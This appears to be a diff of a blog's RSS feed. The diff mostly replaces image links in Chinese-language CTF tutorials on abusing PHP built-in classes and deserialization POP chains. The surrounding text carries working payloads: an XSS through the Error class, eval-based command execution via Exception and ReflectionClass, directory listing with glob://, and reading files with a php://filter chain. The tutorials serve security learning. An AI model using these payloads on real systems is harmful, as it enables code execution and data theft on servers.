@@ -33,14 +33,14 @@
 &lt;p&gt;Payload：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/?a=Error&amp;amp;b=&amp;lt;script&amp;gt;alert(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125022805.png&#34; alt=&#34;image-20211112125022805&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174642487.png&#34; alt=&#34;image-20220411174642487&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;Exception&#34;&gt;&lt;a href=&#34;#Exception&#34; class=&#34;headerlink&#34; title=&#34;Exception&#34;&gt;&lt;/a&gt;Exception&lt;/h3&gt;&lt;p&gt;和Error类一样，也自带tostring方法，也可以造成XSS&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112125139238.png&#34; alt=&#34;image-20211112125139238&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174646116.png&#34; alt=&#34;image-20220411174646116&#34;&gt;&lt;/p&gt;
 &lt;p&gt;既然如此，可以会被PHP执行，我们可以换一种写法，用eval()函数让他造成RCE即可在实战中使用&lt;/p&gt;
 &lt;p&gt;DEMO:&lt;/p&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;echo new &lt;span class=&#34;subst&#34;&gt;$a&lt;/span&gt;(&lt;span class=&#34;subst&#34;&gt;$b&lt;/span&gt;);&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112131536484.png&#34; alt=&#34;image-20211112131536484&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174649940.png&#34; alt=&#34;image-20220411174649940&#34;&gt;&lt;/p&gt;
 &lt;p&gt;payload:&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=Exception&amp;amp;b=system(&amp;quot;whoami&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
@@ -53,18 +53,18 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=DirectoryIterator&amp;amp;b=.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;   此时是遍历当前目录，他回返回第一项，也就应该是一个点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132453027.png&#34; alt=&#34;image-20211112132453027&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174654481.png&#34; alt=&#34;image-20220411174654481&#34;&gt;&lt;/p&gt;
 &lt;p&gt;有的师傅就说了，这有个勾八用，我们其实还可以使用glob://协议进行匹配其余的文件&lt;/p&gt;
 &lt;p&gt;例如:&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=DirectoryIterator&amp;amp;b=glob://flag*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;这里的*依旧是通配符，就会匹配当前目录下的带有flag的文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132648936.png&#34; alt=&#34;image-20211112132648936&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174657529.png&#34; alt=&#34;image-20220411174657529&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这里如果不知道文件名，可以直接暴力搜索，使用正则匹配去使用&lt;/p&gt;
 &lt;p&gt;例如&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=DirectoryIterator&amp;amp;b=glob://f[a-z]*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112132746091.png&#34; alt=&#34;image-20211112132746091&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174700196.png&#34; alt=&#34;image-20220411174700196&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;FilesystemIterator&#34;&gt;&lt;a href=&#34;#FilesystemIterator&#34; class=&#34;headerlink&#34; title=&#34;FilesystemIterator&#34;&gt;&lt;/a&gt;FilesystemIterator&lt;/h3&gt;&lt;p&gt;和Directorylterator差不多，不重复赘述&lt;/p&gt;
 &lt;h3 id=&#34;GlobIterator&#34;&gt;&lt;a href=&#34;#GlobIterator&#34; class=&#34;headerlink&#34; title=&#34;GlobIterator&#34;&gt;&lt;/a&gt;GlobIterator&lt;/h3&gt;&lt;p&gt;GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=GlobIterator&amp;amp;b=f[a-z]*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -76,11 +76,11 @@
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;我们传入?a=SplFileObject&amp;amp;b=flag.php，即可读取我们flag.php里面的内容&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133016528.png&#34; alt=&#34;image-20211112133016528&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174703887.png&#34; alt=&#34;image-20220411174703887&#34;&gt;&lt;/p&gt;
 &lt;p&gt;除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=SplFileObject&amp;amp;b=php://filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112133442470.png&#34; alt=&#34;image-20211112133442470&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174709053.png&#34; alt=&#34;image-20220411174709053&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;反射类&#34;&gt;&lt;a href=&#34;#反射类&#34; class=&#34;headerlink&#34; title=&#34;反射类&#34;&gt;&lt;/a&gt;反射类&lt;/h2&gt;&lt;h3 id=&#34;ReflectionClass&#34;&gt;&lt;a href=&#34;#ReflectionClass&#34; class=&#34;headerlink&#34; title=&#34;ReflectionClass&#34;&gt;&lt;/a&gt;ReflectionClass&lt;/h3&gt;&lt;p&gt;ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作&lt;/p&gt;
 &lt;p&gt;反射类不仅仅可以建立对类的映射，也可以&lt;strong&gt;建立对PHP基本方法的映射&lt;/strong&gt;，并且返回基本方法执行的情况。因此可以通过建立反射类&lt;code&gt;new ReflectionClass(system(&amp;#39;cmd&amp;#39;))&lt;/code&gt;来执行命令&lt;/p&gt;
 &lt;p&gt;这里我们直接使用CTFshow的web109来作为例题&lt;/p&gt;
@@ -89,9 +89,8 @@
 &lt;p&gt;已知了flag在&lt;code&gt;./fl36dg.txt&lt;/code&gt;，命令执行&lt;code&gt;system(‘cat fl36dg.txt’)&lt;/code&gt;获取flag，所以应该传入如下参数&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v1=ReflectionClass&amp;amp;v2=system(&amp;quot;ls&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134027779.png&#34; alt=&#34;image-20211112134027779&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;ReflectionMethod&#34;&gt;&lt;a href=&#34;#ReflectionMethod&#34; class=&#34;headerlink&#34; title=&#34;ReflectionMethod&#34;&gt;&lt;/a&gt;ReflectionMethod&lt;/h3&gt;&lt;p&gt;和ReflectionClass一样，直接上图&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211112134205330.png&#34; alt=&#34;image-20211112134205330&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174715632.png&#34; alt=&#34;image-20220411174715632&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ReflectionMethod&#34;&gt;&lt;a href=&#34;#ReflectionMethod&#34; class=&#34;headerlink&#34; title=&#34;ReflectionMethod&#34;&gt;&lt;/a&gt;ReflectionMethod&lt;/h3&gt;&lt;p&gt;和ReflectionClass一样&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Typecho_Db_Exception&lt;/code&gt;类在/var/Typecho/Db/Query.php中，这里有一个&lt;code&gt;//__toString()&lt;/code&gt;的注释，直接看__toString函数里的内容&lt;/p&gt;
  ]]></description>
         </item>
@@ -105,7 +104,7 @@
             <pubDate>Thu, 11 Nov 2021 13:43:54 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;PHP反序列化之pop链&#34;&gt;&lt;a href=&#34;#PHP反序列化之pop链&#34; class=&#34;headerlink&#34; title=&#34;PHP反序列化之pop链&#34;&gt;&lt;/a&gt;PHP反序列化之pop链&lt;/h1&gt;&lt;h2 id=&#34;POP链介绍&#34;&gt;&lt;a href=&#34;#POP链介绍&#34; class=&#34;headerlink&#34; title=&#34;POP链介绍&#34;&gt;&lt;/a&gt;POP链介绍&lt;/h2&gt;&lt;p&gt;POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的&lt;/p&gt;
 &lt;p&gt;说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。&lt;/p&gt;
-&lt;h2 id=&#34;魔术方法介绍&#34;&gt;&lt;a href=&#34;#魔术方法介绍&#34; class=&#34;headerlink&#34; title=&#34;魔术方法介绍&#34;&gt;&lt;/a&gt;魔术方法介绍&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211110162148224.png&#34; alt=&#34;image-20211110162148224&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;魔术方法介绍&#34;&gt;&lt;a href=&#34;#魔术方法介绍&#34; class=&#34;headerlink&#34; title=&#34;魔术方法介绍&#34;&gt;&lt;/a&gt;魔术方法介绍&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174228630.png&#34; alt=&#34;image-20220411174228630&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;反序列化的常见起点&#34;&gt;&lt;a href=&#34;#反序列化的常见起点&#34; class=&#34;headerlink&#34; title=&#34;反序列化的常见起点&#34;&gt;&lt;/a&gt;反序列化的常见起点&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;code&gt;__wakeup&lt;/code&gt; 一定会调用&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;__destruct&lt;/code&gt; 一定会调用&lt;/li&gt;
